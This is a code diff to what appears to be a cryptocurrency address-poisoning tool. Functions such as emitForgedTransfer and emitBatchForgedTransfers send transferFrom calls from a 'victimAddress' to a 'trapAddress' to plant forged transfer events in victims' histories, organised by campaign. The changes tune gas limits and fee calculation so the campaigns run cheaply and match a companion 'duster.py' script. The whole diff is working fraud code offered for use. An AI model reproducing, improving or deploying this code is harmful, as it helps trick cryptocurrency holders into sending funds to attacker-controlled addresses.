@@ -1016,8 +1016,8 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
         client.getGasPrice(),
       ]);
 
-      // Mirror events typically need ~65,000 gas
-      const estimatedGas = 65000n;
+      // Mirror events typically need ~60,000 gas (exact match with duster.py)
+      const estimatedGas = 60000n;
       const estimatedGasCost = estimatedGas * gasPrice;
 
       if (operatorBalance < estimatedGasCost) {
@@ -1089,16 +1089,24 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 DYNAMIC ULTRA-CHEAP GAS: Pays exact base fee + minimum tip to prevent drops
-    let maxFeePerGas = 100000000n; // 0.1 gwei default
-    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip
+    // 🚀 DUSTER.PY EXACT MATCH: Ultra-cheap gas logic
+    let maxFeePerGas = 2000000000n; // 2 gwei default
+    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei default
 
     try {
-      const feeData = await client.estimateFeesPerGas();
-      if (feeData.maxFeePerGas && feeData.maxFeePerGas > 0n) {
-        maxFeePerGas = feeData.maxFeePerGas; // Use real-time base fee + buffer
-        // Cap tip at 0.01 gwei to save money, but never lower than network suggests if it's tiny
-        maxPriorityFeePerGas = feeData.maxPriorityFeePerGas < 10000000n ? feeData.maxPriorityFeePerGas : 10000000n;
+      const block = await client.getBlock({ blockTag: 'latest' });
+      const baseFee = block.baseFeePerGas || 0n;
+
+      // network_max_fee = int(base_fee * 1.10) + 0.05 gwei
+      const networkMaxFee = baseFee + (baseFee / 10n) + 50000000n;
+      const networkTip = 10000000n; // 0.01 gwei
+      const minThreshold = 100000000n; // 0.1 gwei
+
+      if (networkTip >= networkMaxFee || networkMaxFee < minThreshold) {
+        logger.debug("[mirror] RPC returned glitchy fees. Using ultra-cheap defaults.");
+      } else {
+        maxFeePerGas = networkMaxFee;
+        maxPriorityFeePerGas = networkTip < 50000000n ? networkTip : 50000000n; // min(network_tip, 0.05 gwei)
       }
     } catch (e) {
       logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
@@ -1133,7 +1141,7 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
           functionName: 'transferFrom',
           args: [victimAddress, trapAddress, rawValue],
           nonce: nonce,
-          gas: 65000n, // 🚀 Realistic gas limit for single event emission
+          gas: 60000n, // 🚀 Exact match with duster.py gas limit
           maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
           maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
@@ -1414,16 +1422,24 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 DYNAMIC ULTRA-CHEAP GAS: Pays exact base fee + minimum tip to prevent drops
-    let maxFeePerGas = 100000000n; // 0.1 gwei default
-    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip
+    // 🚀 DUSTER.PY EXACT MATCH: Ultra-cheap gas logic
+    let maxFeePerGas = 2000000000n; // 2 gwei default
+    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei default
 
     try {
-      const feeData = await client.estimateFeesPerGas();
-      if (feeData.maxFeePerGas && feeData.maxFeePerGas > 0n) {
-        maxFeePerGas = feeData.maxFeePerGas; // Use real-time base fee + buffer
-        // Cap tip at 0.01 gwei to save money, but never lower than network suggests if it's tiny
-        maxPriorityFeePerGas = feeData.maxPriorityFeePerGas < 10000000n ? feeData.maxPriorityFeePerGas : 10000000n;
+      const block = await client.getBlock({ blockTag: 'latest' });
+      const baseFee = block.baseFeePerGas || 0n;
+
+      // network_max_fee = int(base_fee * 1.10) + 0.05 gwei
+      const networkMaxFee = baseFee + (baseFee / 10n) + 50000000n;
+      const networkTip = 10000000n; // 0.01 gwei
+      const minThreshold = 100000000n; // 0.1 gwei
+
+      if (networkTip >= networkMaxFee || networkMaxFee < minThreshold) {
+        logger.debug("[batch] RPC returned glitchy fees. Using ultra-cheap defaults.");
+      } else {
+        maxFeePerGas = networkMaxFee;
+        maxPriorityFeePerGas = networkTip < 50000000n ? networkTip : 50000000n; // min(network_tip, 0.05 gwei)
       }
     } catch (e) {
       logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
